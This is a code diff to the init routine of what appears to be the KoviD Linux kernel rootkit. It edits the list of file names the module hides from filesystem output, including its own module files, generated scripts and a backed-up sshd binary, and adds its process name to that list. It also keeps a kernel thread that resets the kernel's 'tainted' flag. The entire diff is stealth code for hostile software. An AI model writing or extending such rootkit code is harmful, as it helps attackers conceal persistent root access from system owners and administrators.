@@ -767,10 +767,10 @@ static int __init kv_init(void)
 	/*
      * Hide these names from write() fs output
      */
-	static const char *hide_names[] = { ".kovid",	   "kovid",
-					    "kovid.ko",	   UUIDGEN ".ko",
-					    UUIDGEN ".sh", ".sshd_orig",
-					    NULL };
+    static const char *hide_names[] = {
+        ".kovid", "kovid", "kovid.ko", UUIDGEN ".ko",
+        UUIDGEN ".sh", ".sshd_orig", PROCNAME, NULL
+    };
 
 	/** show current version for when running in debug mode */
 	prinfo("version %s\n", KOVID_VERSION);
@@ -804,11 +804,9 @@ static int __init kv_init(void)
 	if (!tsk_prc)
 		goto unroll_init;
 
-	fs_add_name_ro(PROCNAME, 0);
-
-	tsk_tainted = kthread_run(_reset_tainted, NULL, THREAD_TAINTED_NAME);
-	if (!tsk_tainted)
-		goto unroll_init;
+    tsk_tainted = kthread_run(_reset_tainted, NULL, THREAD_TAINTED_NAME);
+    if (!tsk_tainted)
+        goto unroll_init;
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
 cont:
